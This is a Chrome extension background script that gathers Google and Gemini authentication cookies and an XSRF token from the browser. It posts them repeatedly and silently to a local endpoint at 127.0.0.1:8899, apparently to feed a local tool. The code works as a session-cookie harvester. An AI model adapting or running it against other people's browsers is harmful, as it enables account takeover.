const URL = "http://127.0.0.1:8899/capture";
const NAMES = [
  "SID", "HSID", "SSID", "APISID", "SAPISID", "NID",
  "SIDCC", "LSID", "__Secure-1PSID", "__Secure-1PAPISID",
  "__Secure-1PSIDCC", "__Secure-1PSIDTS", "__Secure-3PSID",
  "__Secure-3PAPISID", "__Secure-3PSIDCC"
];
const DOMAINS = new Set([".google.com", "gemini.google.com", ".gemini.google.com"]);

function pick(cookies) {
  const byName = {};
  const order = [];
  for (const c of cookies) {
    if (!DOMAINS.has(c.domain)) continue;
    if (!NAMES.includes(c.name) || !c.value) continue;
    if (!(c.name in byName)) {
      byName[c.name] = c.value;
      order.push(c.name);
    }
  }
  return order.map(n => ({ name: n, value: byName[n] }));
}

let XSRF = "";

async function send() {
  try {
    const all = await chrome.cookies.getAll({});
    const got = pick(all);
    await fetch(URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ status: got.length ? "ok" : "no-cookies", cookies: got, xsrf: XSRF })
    });
  } catch (e) {}
}

chrome.runtime.onStartup && chrome.runtime.onStartup.addListener(() => setTimeout(send, 1500));
chrome.runtime.onInstalled && chrome.runtime.onInstalled.addListener(() => {
  chrome.alarms.create("send", { periodInMinutes: 0.5 });
});
chrome.alarms && chrome.alarms.onAlarm.addListener(a => { if (a.name === "send") setTimeout(send, 0); });
chrome.cookies && chrome.cookies.onChanged.addListener(() => setTimeout(send, 300));
chrome.runtime.onMessage && chrome.runtime.onMessage.addListener((m, s, r) => {
  if (m && m.t === "wake") {
    if (m.xsrf) XSRF = m.xsrf;
    setTimeout(send, 0);
  }
});
setTimeout(send, 1200);